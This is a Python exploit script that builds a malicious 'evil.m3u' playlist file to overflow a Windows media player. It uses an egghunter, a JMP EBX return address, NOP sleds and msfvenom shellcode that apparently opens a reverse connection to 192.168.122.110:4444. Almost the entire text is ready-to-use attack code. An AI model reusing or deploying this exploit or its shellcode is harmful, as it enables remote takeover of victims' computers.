

egghunter =  b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
egghunter += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
egghunter += b"\xea\xaf\x75\xe7\xff\xe7"

#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#No encoder or badchars specified, outputting raw payload
#Payload size: 341 bytes
#Final size of python file: 1908 bytes
shellcode =  b""
shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
shellcode += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
shellcode += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89"
shellcode += b"\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54"
shellcode += b"\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68"
shellcode += b"\xc0\xa8\x7a\x6e\x68\x02\x00\x11\x5c\x89\xe6"
shellcode += b"\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
shellcode += b"\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99"
shellcode += b"\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e"
shellcode += b"\x08\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a"
shellcode += b"\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83"
shellcode += b"\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10"
shellcode += b"\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff"
shellcode += b"\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
shellcode += b"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68"
shellcode += b"\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f"
shellcode += b"\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5"
shellcode += b"\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff"
shellcode += b"\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1"
shellcode += b"\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5"

JMP_EBX = "\xf5\x4f\x40\x00"
LENGTH_SHELLCODE = 341

# Egghunter lands in EBX register. What must follow the egghunter is NOPs to not break execution. Then we JMP EBX because that is where execution is hijacked. We had another NOP-sled of 18 bytes prior to reaching our double egg and shellcode and then follow it with another NOP-sled to smooth execution
payload = "A"*(28) + egghunter + "\x90"*(234-28-32) + JMP_EBX + "\x90"*18 + "w00tw00t" + shellcode + "\x90"*(2000-28-32-234-4-18-LENGTH_SHELLCODE)

filename = "evil.m3u"

w = open(filename,'w')
w.write(payload)
w.close()
